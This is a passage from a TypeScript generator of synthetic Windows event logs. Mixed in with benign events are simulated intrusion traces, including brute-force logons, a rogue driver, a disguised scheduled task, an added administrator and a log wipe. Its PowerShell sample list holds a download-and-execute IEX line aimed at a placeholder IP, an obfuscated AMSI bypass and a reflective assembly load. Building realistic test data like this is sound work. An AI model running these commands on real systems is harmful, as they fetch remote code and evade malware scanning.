          ["NewProcessId", hx(pid)],
          ["NewProcessName", p.image],
          ["TokenElevationType", "%%1938"],
          ["ProcessId", hx(pidOf(r, parent))],
          ["CommandLine", p.cmd],
          ["TargetUserSid", "S-1-0-0"],
          ["TargetUserName", "-"],
          ["TargetDomainName", "-"],
          ["TargetLogonId", "0x0"],
          ["ParentProcessName", parent.image],
          ["MandatoryLabel", p.integrity === "System" ? "S-1-16-16384" : p.integrity === "High" ? "S-1-16-12288" : "S-1-16-8192"],
        ],
        message:
          `A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\t${mine ? USER_SID : "S-1-5-18"}\n\tAccount Name:\t\t${mine ? USER : HOST + "$"}\n\tAccount Domain:\t\t${mine ? HOST : "WORKGROUP"}\n\n` +
          `Process Information:\n\tNew Process ID:\t\t0x${pid.toString(16)}\n\tNew Process Name:\t${p.image}\n\tToken Elevation Type:\t%%1938\n\tMandatory Label:\t\tMandatory Label\\${p.integrity} Mandatory Level\n\tCreator Process Name:\t${parent.image}\n\tProcess Command Line:\t${p.cmd}`,
      };
    }
    case 4634:
      return {
        ...SEC,
        ...OK,
        eventId: 4634,
        task: 12545,
        taskName: "Logoff",
        data: [["TargetUserSid", USER_SID], ["TargetUserName", USER], ["TargetDomainName", HOST], ["TargetLogonId", logon], ["LogonType", "2"]],
        message: `An account was logged off.\n\nSubject:\n\tSecurity ID:\t\t${USER_SID}\n\tAccount Name:\t\t${USER}\n\tAccount Domain:\t\t${HOST}\n\tLogon ID:\t\t${logon}\n\nLogon Type:\t\t\t2\n\nThis event is generated when a logon session is destroyed.`,
      };
    case 5156: {
      const p = weighted(r, PROCS, WEIGHTS);
      const [ip, , port] = pick(r, NET);
      return {
        ...SEC,
        ...OK,
        eventId: 5156,
        version: 1,
        task: 12810,
        taskName: "Filtering Platform Connection",
        pid: 4,
        data: [
          ["ProcessID", String(pidOf(r, p))],
          ["Application", p.image.replace("C:", "\\device\\harddiskvolume3")],
          ["Direction", "%%14593"],
          ["SourceAddress", "192.168.1.42"],
          ["SourcePort", String(int(r, 49152, 65535))],
          ["DestAddress", ip],
          ["DestPort", String(port)],
          ["Protocol", port === 53 ? "17" : "6"],
          ["FilterRTID", String(int(r, 60000, 90000))],
          ["LayerName", "%%14611"],
          ["LayerRTID", "48"],
        ],
        message: `The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t${pidOf(r, p)}\n\tApplication Name:\t${p.image.replace("C:", "\\device\\harddiskvolume3")}\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t192.168.1.42\n\tDestination Address:\t${ip}\n\tDestination Port:\t\t${port}\n\tProtocol:\t\t${port === 53 ? 17 : 6}`,
      };
    }
    case 4798:
      return {
        ...SEC,
        ...OK,
        eventId: 4798,
        task: 13824,
        taskName: "User Account Management",
        data: [["TargetUserName", USER], ["TargetDomainName", HOST], ["TargetSid", USER_SID], ...subject(USER_SID, USER, HOST, "0xBC0A1"), ["CallerProcessId", "0x1970"], ["CallerProcessName", "C:\\Windows\\explorer.exe"]],
        message: `A user's local group membership was enumerated.\n\nSubject:\n\tSecurity ID:\t\t${USER_SID}\n\tAccount Name:\t\t${USER}\n\nUser:\n\tSecurity ID:\t\t${USER_SID}\n\tAccount Name:\t\t${USER}\n\nProcess Information:\n\tProcess ID:\t\t0x1970\n\tProcess Name:\t\tC:\\Windows\\explorer.exe`,
      };
    case 5379:
      return {
        ...SEC,
        ...OK,
        eventId: 5379,
        task: 13824,
        taskName: "User Account Management",
        data: [...subject(USER_SID, USER, HOST, "0xBC0A1"), ["TargetName", pick(r, ["git:https://github.com", "MicrosoftAccount:user=alex@outlook.com", "Shellmosaic/ssh:prod-bastion"])], ["Type", "0"], ["CountOfCredentialsReturned", "1"], ["ReadOperation", "%%8100"], ["ReturnCode", "0"], ["ProcessCreationTime", new Date(t - 3600000).toISOString()], ["ClientProcessId", "14388"]],
        message: "Credential Manager credentials were read.\n\nSubject:\n\tSecurity ID:\t\t" + USER_SID + "\n\tAccount Name:\t\talex\n\tAccount Domain:\t\t" + HOST + "\n\tLogon ID:\t\t0xBC0A1\n\tRead Operation:\t\tEnumerate Credentials\n\nThis event occurs when a user performs a read operation on stored credentials in Credential Manager.",
      };
    case 4648:
      return {
        ...SEC,
        ...OK,
        eventId: 4648,
        task: 12544,
        taskName: "Logon",
        data: [...subject(USER_SID, USER, HOST, "0xBC0A1"), ["TargetUserName", "svc-backup"], ["TargetDomainName", "CONTOSO"], ["TargetServerName", "fs01.contoso.local"], ["ProcessId", "0x1e44"], ["ProcessName", "C:\\Windows\\System32\\runas.exe"], ["IpAddress", "-"], ["IpPort", "-"]],
        message: `A logon was attempted using explicit credentials.\n\nSubject:\n\tSecurity ID:\t\t${USER_SID}\n\tAccount Name:\t\t${USER}\n\nAccount Whose Credentials Were Used:\n\tAccount Name:\t\tsvc-backup\n\tAccount Domain:\t\tCONTOSO\n\nTarget Server:\n\tTarget Server Name:\tfs01.contoso.local\n\nProcess Information:\n\tProcess ID:\t\t0x1e44\n\tProcess Name:\t\tC:\\Windows\\System32\\runas.exe`,
      };
    case 4776: {
      const bad = r() < 0.4;
      return {
        ...SEC,
        ...(bad ? FAIL : OK),
        eventId: 4776,
        task: 14336,
        taskName: "Credential Validation",
        data: [["PackageName", "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"], ["TargetUserName", bad ? pick(r, BAD_USERS) : USER], ["Workstation", bad ? "kali" : HOST], ["Status", bad ? "0xc0000064" : "0x0"]],
        message: `The computer attempted to validate the credentials for an account.\n\nAuthentication Package:\tMICROSOFT_AUTHENTICATION_PACKAGE_V1_0\nLogon Account:\t${bad ? "admin" : USER}\nSource Workstation:\t${bad ? "kali" : HOST}\nError Code:\t${bad ? "0xC0000064" : "0x0"}`,
      };
    }
    case 4697:
      return {
        ...SEC,
        ...OK,
        eventId: 4697,
        task: 12289,
        taskName: "Security System Extension",
        data: [...subject(USER_SID, USER, HOST, "0xBC0A1"), ["ServiceName", "WinRing0_1_2_0"], ["ServiceFileName", "C:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys"], ["ServiceType", "0x1"], ["ServiceStartType", "3"], ["ServiceAccount", ""]],
        message: "A service was installed in the system.\n\nSubject:\n\tSecurity ID:\t\t" + USER_SID + "\n\tAccount Name:\t\talex\n\nService Information:\n\tService Name:\t\tWinRing0_1_2_0\n\tService File Name:\tC:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys\n\tService Type:\t\t0x1\n\tService Start Type:\t3\n\tService Account:\t\t",
      };
    case 4698:
      return {
        ...SEC,
        ...OK,
        eventId: 4698,
        task: 12804,
        taskName: "Other Object Access Events",
        data: [...subject(USER_SID, USER, HOST, "0xBC0A1"), ["TaskName", "\\OneDrive Updater"], ["TaskContent", '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2"><Actions Context="Author"><Exec><Command>C:\\Users\\alex\\AppData\\Local\\Temp\\upd.exe</Command><Arguments>-silent</Arguments></Exec></Actions></Task>']],
        message: "A scheduled task was created.\n\nSubject:\n\tSecurity ID:\t\t" + USER_SID + "\n\tAccount Name:\t\talex\n\nTask Information:\n\tTask Name: \t\t\\OneDrive Updater\n\tTask Content: \t\t<Exec><Command>C:\\Users\\alex\\AppData\\Local\\Temp\\upd.exe</Command><Arguments>-silent</Arguments></Exec>",
      };
    case 4720:
    case 4732: {
      const added = id === 4732;
      return {
        ...SEC,
        ...OK,
        eventId: id,
        task: added ? 13826 : 13824,
        taskName: added ? "Security Group Management" : "User Account Management",
        data: added
          ? [["MemberName", "-"], ["MemberSid", "S-1-5-21-3623811015-3361044348-30300820-1004"], ["TargetUserName", "Administrators"], ["TargetDomainName", "Builtin"], ["TargetSid", "S-1-5-32-544"], ...subject(USER_SID, USER, HOST, "0xBC0A1"), ["PrivilegeList", "-"]]
          : [["TargetUserName", "support_tmp"], ["TargetDomainName", HOST], ["TargetSid", "S-1-5-21-3623811015-3361044348-30300820-1004"], ...subject(USER_SID, USER, HOST, "0xBC0A1"), ["SamAccountName", "support_tmp"], ["DisplayName", "%%1793"], ["UserAccountControl", "\n\t\t%%2080\n\t\t%%2082\n\t\t%%2084"]],
        message: added
          ? "A member was added to a security-enabled local group.\n\nSubject:\n\tSecurity ID:\t\t" + USER_SID + "\n\tAccount Name:\t\talex\n\nMember:\n\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-1004\n\nGroup:\n\tSecurity ID:\t\tS-1-5-32-544\n\tGroup Name:\t\tAdministrators\n\tGroup Domain:\t\tBuiltin"
          : "A user account was created.\n\nSubject:\n\tSecurity ID:\t\t" + USER_SID + "\n\tAccount Name:\t\talex\n\nNew Account:\n\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-1004\n\tAccount Name:\t\tsupport_tmp\n\tAccount Domain:\t\t" + HOST,
      };
    }
    case 4740:
      return {
        ...SEC,
        ...OK,
        eventId: 4740,
        task: 13824,
        taskName: "User Account Management",
        data: [["TargetUserName", "backup"], ["TargetDomainName", "kali"], ["TargetSid", "S-1-5-21-3623811015-3361044348-30300820-1003"], ...subject()],
        message: "A user account was locked out.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\t" + HOST + "$\n\nAccount That Was Locked Out:\n\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-1003\n\tAccount Name:\t\tbackup\n\nAdditional Information:\n\tCaller Computer Name:\tkali",
      };
    default:
      return {
        provider: "Microsoft-Windows-Eventlog",
        guid: "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}",
        eventId: 1102,
        version: 0,
        level: 4,
        task: 104,
        taskName: "Log clear",
        opcode: 0,
        keywords: "0x4020000000000000",
        keywordNames: ["Audit Success"],
        pid: 1520,
        userData: `<LogFileCleared xmlns='http://manifests.microsoft.com/win/2004/08/windows/eventlog'><SubjectUserSid>${USER_SID}</SubjectUserSid><SubjectUserName>${USER}</SubjectUserName><SubjectDomainName>${HOST}</SubjectDomainName><SubjectLogonId>0xbc0a1</SubjectLogonId></LogFileCleared>`,
        message: `The audit log was cleared.\nSubject:\n\tSecurity ID:\t${USER_SID}\n\tAccount Name:\t${USER}\n\tDomain Name:\t${HOST}\n\tLogon ID:\t0xBC0A1`,
      };
  }
};

// ── System ───────────────────────────────────────────────────────────────

const SERVICES = ["Windows Update", "Background Intelligent Transfer Service", "WinHTTP Web Proxy Auto-Discovery Service", "Windows Modules Installer", "Microsoft Defender Antivirus Service", "Delivery Optimization", "Windows Error Reporting Service", "Device Setup Manager", "Software Protection", "Google Update Service (gupdate)", "Shellmosaic Elevation Helper", "Diagnostic Policy Service"];
const SCM = { provider: "Service Control Manager", guid: "{555908d1-a6d7-4695-8e1e-26931d2012f4}", classic: true, qualifiers: 16384, pid: 1004, keywords: "0x8080000000000000", keywordNames: ["Classic"] } as const;

const systemMaker: Maker = (r, t) => {
  const id = weighted(r, [7036, 7040, 10016, 1014, 7000, 7023, 7031, 7045, 41, 6008, 6005, 6013, 1, 16, 219, 129, 19, 43, 20, 134, 153, 10010, 1074], [30, 5, 10, 5, 1.5, 1, 1, 0.6, 0.25, 0.25, 1, 1.5, 2, 3, 1, 0.5, 2, 2, 0.4, 1, 0.6, 1, 0.5]);
  const svc = pick(r, SERVICES);
  switch (id) {
    case 7036: {
      const state = pick(r, ["running", "stopped"]);
      return { ...SCM, eventId: 7036, level: 4, data: [["param1", svc], ["param2", state], ["Binary", "57007500610075007300650072007600"]], message: `The ${svc} service entered the ${state} state.` };
    }
    case 7040:
      return { ...SCM, eventId: 7040, level: 4, sid: USER_SID, data: [["param1", "Background Intelligent Transfer Service"], ["param2", "auto start"], ["param3", "demand start"], ["param4", "BITS"]], message: "The start type of the Background Intelligent Transfer Service service was changed from auto start to demand start." };
    case 7000:
    case 7023:
    case 7031: {
      const s = pick(r, ["Shellmosaic Elevation Helper", "Razer Synapse Service", "vgc", "Intel(R) Dynamic Application Loader Host Interface Service"]);
      const msg =
        id === 7000
          ? `The ${s} service failed to start due to the following error: \nThe system cannot find the file specified.`
          : id === 7023
            ? `The ${s} service terminated with the following error: \nThe device is not ready.`
            : `The ${s} service terminated unexpectedly.  It has done this 1 time(s).  The following corrective action will be taken in 60000 milliseconds: Restart the service.`;
      return { ...SCM, qualifiers: 49152, eventId: id, level: 2, data: [["param1", s], ["param2", "%%2"]], message: msg };
    }
    case 7045:
      return {
        ...SCM,
        eventId: 7045,
        level: 4,
        sid: USER_SID,
        data: [["ServiceName", "WinRing0_1_2_0"], ["ImagePath", "C:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys"], ["ServiceType", "kernel mode driver"], ["StartType", "demand start"], ["AccountName", ""]],
        message: "A service was installed in the system.\n\nService Name:  WinRing0_1_2_0\nService File Name:  C:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys\nService Type:  kernel mode driver\nService Start Type:  demand start\nService Account:  ",
      };
    case 10016:
    case 10010:
      return {
        provider: "Microsoft-Windows-DistributedCOM",
        guid: "{1b562e86-b7aa-4131-badc-b6f3a001407e}",
        classic: true,
        qualifiers: id === 10016 ? 0 : 49152,
        eventId: id,
        level: id === 10016 ? 3 : 2,
        task: 0,
        pid: 1112,
        keywords: "0x8080000000000000",
        keywordNames: ["Classic"],
        sid: id === 10016 ? "S-1-5-18" : undefined,
        data: [["param1", "application-specific"], ["param2", "Local"], ["param3", "Activation"], ["param4", "{2593F8B9-4EAF-457C-B68A-50F6B8EA6B54}"], ["param5", "{15C20B67-12E7-4BB6-92BB-7AFF07997402}"]],
        message:
          id === 10016
            ? "The application-specific permission settings do not grant Local Activation permission for the COM Server application with CLSID \n{2593F8B9-4EAF-457C-B68A-50F6B8EA6B54}\n and APPID \n{15C20B67-12E7-4BB6-92BB-7AFF07997402}\n to the user NT AUTHORITY\\SYSTEM SID (S-1-5-18) from address LocalHost (Using LRPC) running in the application container Unavailable SID (Unavailable). This security permission can be modified using the Component Services administrative tool."
            : "The server {A463FCB9-6B1C-4E0D-A80B-A2CA7999E25D} did not register with DCOM within the required timeout.",
      };
    case 1014:
      return {
        provider: "Microsoft-Windows-DNS-Client",
        guid: "{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}",
        eventId: 1014,
        level: 3,
        task: 1014,
        opcode: 0,
        keywords: "0x4000000010000000",
        pid: 2216,
        sid: "S-1-5-20",
        data: [["QueryName", "wpad"], ["AddressLength", "128"], ["Address", "02000000C0A801010000000000000000"]],
        message: "Name resolution for the name wpad timed out after none of the configured DNS servers responded.\nClient PID 2216.",
      };
    case 41:
      return {
        provider: "Microsoft-Windows-Kernel-Power",
        guid: "{331c3b3a-2005-44c2-ac5e-77220c37d6b4}",
        eventId: 41,
        version: 9,
        level: 1,
        task: 63,
        opcode: 0,
        keywords: "0x8000400000000002",
        pid: 4,
        sid: "S-1-5-18",
        data: [["BugcheckCode", "0"], ["BugcheckParameter1", "0x0"], ["PowerButtonTimestamp", "0"], ["SleepInProgress", "0"], ["PowerButtonSuppressed", "false"], ["LongPowerButtonPressDetected", "false"]],
        message: "The system has rebooted without cleanly shutting down first. This error could be caused if the system stopped responding, crashed, or lost power unexpectedly.",
        taskName: "(63)",
        opcodeName: "Info",
      };
    case 6008:
    case 6005:
    case 6013: {
      const level = id === 6008 ? 2 : 4;
      const msg = id === 6008 ? `The previous system shutdown at ${new Date(t - 90000).toLocaleTimeString()} on ${new Date(t - 90000).toLocaleDateString()} was unexpected.` : id === 6005 ? "The Event log service was started." : `The system uptime is ${int(r, 3600, 900000)} seconds.`;
      return { provider: "EventLog", classic: true, qualifiers: id === 6008 ? 32768 : 32768, eventId: id, level, pid: 0, keywords: "0x80000000000000", keywordNames: ["Classic"], data: id === 6013 ? [["Data 1", ""], ["Data 2", "60"]] : [], message: msg };
    }
    case 1:
    case 16:
      return {
        provider: "Microsoft-Windows-Kernel-General",
        guid: "{a68ca8b7-004f-d7b6-a698-07e2de0f1f5d}",
        eventId: id,
        version: id === 1 ? 2 : 0,
        level: 4,
        task: id === 1 ? 5 : 6,
        taskName: "",
        keywords: id === 1 ? "0x8000000000000010" : "0x8000000000000000",
        pid: 4,
        sid: id === 1 ? "S-1-5-19" : "S-1-5-18",
        data:
          id === 1
            ? [["NewTime", new Date(t).toISOString()], ["OldTime", new Date(t - 812).toISOString()], ["Reason", "2"]]
            : [["HiveNameLength", "40"], ["HiveName", "\\??\\C:\\Users\\alex\\ntuser.dat"], ["KeysUpdated", String(int(r, 20, 900))], ["DirtyPages", String(int(r, 2, 80))]],
        message:
          id === 1
            ? `The system time has changed to ${new Date(t).toISOString()} from ${new Date(t - 812).toISOString()}.\n\nChange Reason: An application or system component changed the time.`
            : "The access history in hive \\??\\C:\\Users\\alex\\ntuser.dat was cleared updating " + int(r, 20, 900) + " keys and creating " + int(r, 2, 80) + " modified pages.",
      };
    case 219:
      return {
        provider: "Microsoft-Windows-Kernel-PnP",
        guid: "{9c205a39-1250-487d-abd7-e831c6290539}",
        eventId: 219,
        version: 0,
        level: 3,
        task: 212,
        keywords: "0x8000000000000000",
        pid: 4,
        sid: "S-1-5-18",
        data: [["DriverNameLength", "60"], ["DriverName", "ROOT\\SYSTEM\\0002"], ["Status", "3221226341"], ["FailureNameLength", "18"], ["FailureName", "\\Driver\\WudfRd"], ["Version", "0"]],
        message: "The driver \\Driver\\WudfRd failed to load for the device ROOT\\SYSTEM\\0002.",
        taskName: "(212)",
      };
    case 129:
      return { provider: "storahci", classic: true, qualifiers: 32772, eventId: 129, level: 3, keywords: "0x80000000000000", keywordNames: ["Classic"], data: [["Data 1", "\\Device\\RaidPort0"], ["Binary", "0F001800010000000000000081000480"]], message: "Reset to device, \\Device\\RaidPort0, was issued." };
    case 19:
    case 43:
    case 20: {
      const kb = pick(r, ["Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.421.161.0) - Current Channel (Broad)", "2026-10 Cumulative Update for Windows 11 Version 25H2 for x64-based Systems (KB5048667)", "Windows Malicious Software Removal Tool x64 - v5.130 (KB890830)", "NVIDIA - Display - 32.0.15.6614"]);
      return {
        provider: "Microsoft-Windows-WindowsUpdateClient",
        guid: "{945a8954-c147-4acd-923f-40c45405a658}",
        eventId: id,
        version: 1,
        level: id === 20 ? 2 : 4,
        task: 1,
        taskName: "Windows Update Agent",
        opcode: id === 43 ? 12 : 13,
        opcodeName: id === 43 ? "Installation" : "Installation",
        keywords: "0x8000000000004018",
        keywordNames: ["Installation", "Success"],
        pid: 7312,
        sid: "S-1-5-18",
        data: [["updateTitle", kb], ["updateGuid", "{c71f53b2-21f3-4f19-9e15-3b0a2a3f5e13}"], ["updateRevisionNumber", "200"], ["serviceGuid", "{7971f918-a847-4430-9279-4a52d1efe18d}"], ...(id === 20 ? ([["errorCode", "0x80073712"]] as [string, string][]) : [])],
        message: id === 19 ? `Installation Successful: Windows successfully installed the following update: ${kb}` : id === 43 ? `Installation Started: Windows has started installing the following update: ${kb}` : `Installation Failure: Windows failed to install the following update with error 0x80073712: ${kb}.`,
      };
    }
    case 134:
      return {
        provider: "Microsoft-Windows-Time-Service",
        guid: "{06edcfeb-0fd0-4e53-acca-a6f8bbf81bcb}",
        eventId: 134,
        level: 3,
        task: 0,
        keywords: "0x8000000000000000",
        pid: 2740,
        sid: "S-1-5-19",
        data: [["TimeSource", "time.windows.com,0x9"], ["ErrorMessage", "No such host is known. (0x80072AF9)"], ["RetryMinutes", "15"]],
        message: "NtpClient was unable to set a manual peer to use as a time source because of DNS resolution error on 'time.windows.com,0x9'. NtpClient will try again in 15 minutes and double the reattempt interval thereafter. The error was: No such host is known. (0x80072AF9)",
      };
    case 153:
      // a driver without message files: raw XML, no RenderingInfo
      return { provider: "nvlddmkm", classic: true, qualifiers: 49316, eventId: 153, level: 2, keywords: "0x80000000000000", data: [["Data 1", "\\Device\\Video3"], ["Data 2", "Error occurred on GPUID: 100"], ["Binary", "000000000300000000000000000000000000000000000000"]], message: null };
    default:
      return {
        provider: "User32",
        classic: true,
        qualifiers: 32768,
        eventId: 1074,
        level: 4,
        keywords: "0x8080000000000000",
        keywordNames: ["Classic"],
        sid: USER_SID,
        pid: 6512,
        data: [["param1", "C:\\Windows\\system32\\shutdown.exe (" + HOST + ")"], ["param2", HOST], ["param3", "No title for this reason could be found"], ["param4", "0x800000ff"], ["param5", "restart"], ["param6", ""], ["param7", ME]],
        message: `The process C:\\Windows\\system32\\shutdown.exe (${HOST}) has initiated the restart of computer ${HOST} on behalf of user ${ME} for the following reason: No title for this reason could be found\n Reason Code: 0x800000ff\n Shutdown Type: restart\n Comment: `,
      };
  }
};

// ── Application ──────────────────────────────────────────────────────────

const applicationMaker: Maker = (r, t) => {
  const id = weighted(r, [16384, 16394, 1000, 1001, 1002, 1026, 1040, 1033, 8224, 15, 1534, 326, 327, 0, 9027, 1], [8, 4, 2, 3, 0.6, 1, 2, 1.5, 2, 2, 2, 2, 2, 3, 1, 2]);
  switch (id) {
    case 16384:
    case 16394:
      return { provider: "Microsoft-Windows-Security-SPP", guid: "{e23b33b0-c8c9-472c-a5f9-f2bdfea0f156}", classic: true, qualifiers: 16384, eventId: id, level: 4, keywords: "0x80000000000000", keywordNames: ["Classic"], pid: 0, data: id === 16384 ? [["Data 1", new Date(t + 3600000 * 24 * 30).toISOString()], ["Data 2", "RulesEngine"]] : [], message: id === 16384 ? `Successfully scheduled Software Protection service for re-start at ${new Date(t + 3600000 * 24 * 30).toISOString()}. Reason: RulesEngine.` : "Offline downlevel migration succeeded." };
    case 1000:
    case 1002: {
      const app = pick(r, ["cs2.exe", "explorer.exe", "loader.exe", "Discord.exe", "steamwebhelper.exe"]);
      return {
        provider: id === 1000 ? "Application Error" : "Application Hang",
        guid: id === 1000 ? "{a0e9b465-b939-57d7-b27d-95d8e925ff57}" : undefined,
        classic: true,
        qualifiers: 0,
        eventId: id,
        level: 2,
        task: id === 1000 ? 100 : 101,
        taskName: id === 1000 ? "Application Crashing Events" : "Hanging Events",
        keywords: "0x80000000000000",
        keywordNames: ["Classic"],
        data: [["AppName", app], ["AppVersion", "1.40.3.8"], ["AppTimeStamp", "67102c1a"], ["ModuleName", app === "loader.exe" ? "hook64.dll" : "ntdll.dll"], ["ModuleVersion", "10.0.26100.2161"], ["ExceptionCode", "c0000005"], ["FaultingOffset", "00000000000a3f41"], ["ProcessId", hx(int(r, 0x400, 0x7000))]],
        message:
          id === 1000
            ? `Faulting application name: ${app}, version: 1.40.3.8, time stamp: 0x67102c1a\nFaulting module name: ${app === "loader.exe" ? "hook64.dll" : "ntdll.dll"}, version: 10.0.26100.2161, time stamp: 0x2b6f2bd5\nException code: 0xc0000005\nFault offset: 0x00000000000a3f41\nFaulting process id: 0x4A18\nFaulting application start time: 0x1DB26E0A1C9F3E1\nFaulting application path: C:\\Games\\Counter-Strike 2\\game\\bin\\win64\\${app}\nFaulting module path: C:\\Windows\\SYSTEM32\\ntdll.dll\nReport Id: ${guid(r).slice(1, -1)}`
            : `The program ${app} version 1.40.3.8 stopped interacting with Windows and was closed. To see if more information about the problem is available, check the problem history in the Security and Maintenance control panel.\n Process ID: 3fc4\n Hang type: Quiesce`,
      };
    }
    case 1001:
      return { provider: "Windows Error Reporting", classic: true, qualifiers: 0, eventId: 1001, level: 4, keywords: "0x80000000000000", keywordNames: ["Classic"], data: [["Data 1", String(int(r, 1e9, 2e9))], ["Data 2", "5"], ["Data 3", "StoreAgentScanForUpdatesFailure0"], ["Data 4", "Not available"]], message: `Fault bucket ${int(r, 1e9, 2e9)}, type 5\nEvent Name: StoreAgentScanForUpdatesFailure0\nResponse: Not available\nCab Id: 0\n\nProblem signature:\nP1: Update;\nP2: 8024500c\nP3: 26100\nP4: 2161\n\nAttached files:\n\nThese files may be available here:\n\n\nAnalysis symbol: \nRechecking for solution: 0\nReport Id: ${guid(r).slice(1, -1)}\nReport Status: 4\nHashed bucket: \nCab Guid: 0` };
    case 1026:
      return { provider: ".NET Runtime", classic: true, qualifiers: 0, eventId: 1026, level: 2, keywords: "0x80000000000000", keywordNames: ["Classic"], data: [["Data", "Application: Updater.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.Net.WebException\n   at System.Net.WebClient.DownloadDataInternal(System.Uri, System.Net.WebRequest ByRef)"]], message: "Application: Updater.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.Net.WebException\n   at System.Net.WebClient.DownloadDataInternal(System.Uri, System.Net.WebRequest ByRef)\n   at Updater.Program.Main(System.String[])" };
    case 1040:
    case 1033:
      return { provider: "MsiInstaller", classic: true, qualifiers: 0, eventId: id, level: 4, keywords: "0x80000000000000", keywordNames: ["Classic"], sid: USER_SID, pid: 0, data: [["Data 1", "C:\\Users\\alex\\Downloads\\node-v24.11.0-x64.msi"], ["Data 2", "8580"]], message: id === 1040 ? "Beginning a Windows Installer transaction: C:\\Users\\alex\\Downloads\\node-v24.11.0-x64.msi. Client Process Id: 8580." : "Windows Installer installed the product. Product Name: Node.js. Product Version: 24.11.0. Product Language: 1033. Manufacturer: OpenJS Foundation. Installation success or error status: 0." };
    case 8224:
      return { provider: "VSS", classic: true, qualifiers: 0, eventId: 8224, level: 4, keywords: "0x80000000000000", keywordNames: ["Classic"], data: [["Binary", "2D20436F64653A20434F525356434330303030303637332D2043616C6C3A20434F525356434330303030303634312D205049443A202030303030353539362D205449443A202030303030363531362D20434D443A2020433A5C57494E444F57535C73797374656D33325C76737376632E657865202020"]], message: "The VSS service is shutting down due to idle timeout." };
    case 15:
      return { provider: "SecurityCenter", classic: true, qualifiers: 0, eventId: 15, level: 4, keywords: "0x80000000000000", keywordNames: ["Classic"], data: [["Data 1", "Windows Defender"], ["Data 2", "SECURITY_PRODUCT_STATE_ON"]], message: "Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON." };
    case 1534:
      return { provider: "Microsoft-Windows-User Profiles Service", guid: "{89b1e9f0-5aff-44a6-9b44-0a07a7ce5845}", eventId: 1534, level: 3, task: 0, keywords: "0x8000000000000000", sid: "S-1-5-18", pid: 1440, data: [["Event", "Initialization"], ["Context", "{56EA1054-1959-467F-BE3B-A2A787C4B6EA}"], ["Error", "Access is denied. "]], message: "Profile notification of event Initialization for component {56EA1054-1959-467F-BE3B-A2A787C4B6EA} failed, error code is Access is denied. \n." };
    case 326:
    case 327:
      return { provider: "ESENT", classic: true, qualifiers: 0, eventId: id, level: 4, task: 1, taskName: "General", keywords: "0x80000000000000", keywordNames: ["Classic"], data: [["Data 1", "svchost"], ["Data 2", "5916,D,50"], ["Data 3", ""], ["Data 4", "C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db"], ["Data 5", "0"]], message: `svchost (5916,D,50) The database engine ${id === 326 ? "attached" : "detached"} a database (1, C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db). (Time=0 seconds)` };
    case 0:
      // a provider without message files: raw XML only
      return { provider: "edgeupdate", classic: true, qualifiers: 0, eventId: 0, level: 4, keywords: "0x80000000000000", data: [["Data", "Service stopped"]], message: null };
    case 9027:
      return { provider: "Desktop Window Manager", classic: true, qualifiers: 16384, eventId: 9027, level: 4, keywords: "0x80000000000000", keywordNames: ["Classic"], data: [], message: "The Desktop Window Manager has registered the session port." };
    default:
      return { provider: "Shellmosaic", classic: true, qualifiers: 0, eventId: 1, level: 4, keywords: "0x80000000000000", data: [["Data", `Session restored (${int(r, 1, 6)} tabs, ${int(r, 1, 12)} panes)`]], message: null };
  }
};

// ── PowerShell, Defender, Task Scheduler, RDP, Code Integrity ──────────────

const SCRIPTS: [string, number][] = [
  ["Get-ChildItem -Path $env:TEMP -Filter *.log | Remove-Item -Force", 5],
  ["Import-Module PSReadLine; Set-PSReadLineOption -PredictionSource History", 5],
  ["$client = New-Object Net.WebClient\nIEX ($client.DownloadString('http://198.51.100.23:8080/p.ps1'))", 3],
  ["[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,$true)", 3],
  ["Get-Process | Sort-Object CPU -Descending | Select-Object -First 10", 5],
  ["{ Set-StrictMode -Version 1; $_.PSMessageDetails }", 5],
  ["Invoke-WebRequest -Uri https://github.com/PowerShell/PowerShell/releases/latest -UseBasicParsing", 5],
  ["$b = [Convert]::FromBase64String($payload); [System.Reflection.Assembly]::Load($b)", 3],
];

const powershellMaker: Maker = (r) => {
  const id = weighted(r, [4104, 4103, 40961, 40962, 53504], [10, 6, 1, 1, 1]);
  const ps = { provider: "Microsoft-Windows-PowerShell", guid: "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", pid: int(r, 2000, 30000) & ~3, sid: USER_SID, activity: guid(r).toUpperCase() };
  if (id === 4104) {
    const [script, level] = weighted(r, SCRIPTS, [6, 6, 1, 0.5, 6, 8, 3, 0.4]);
    const sb = guid(r).slice(1, -1);
    return {
      ...ps,
      eventId: 4104,
      version: 1,
      level,
      task: 2,
      taskName: "Execute a Remote Command",
      opcode: 15,
      opcodeName: "On create calls",
      keywords: "0x0",
      data: [["MessageNumber", "1"], ["MessageTotal", "1"], ["ScriptBlockText", script], ["ScriptBlockId", sb], ["Path", level === 3 ? "" : "C:\\Users\\alex\\Documents\\WindowsPowerShell\\profile.ps1"]],
      message: `Creating Scriptblock text (1 of 1):\n${script}\n\nScriptBlock ID: ${sb}\nPath: ${level === 3 ? "" : "C:\\Users\\alex\\Documents\\WindowsPowerShell\\profile.ps1"}`,
    };
  }
  if (id === 4103) {
    const cmd = pick(r, ["Get-Process", "Get-Service", "Out-Default", "Set-Location", "Get-NetTCPConnection", "Invoke-WebRequest"]);
    return {
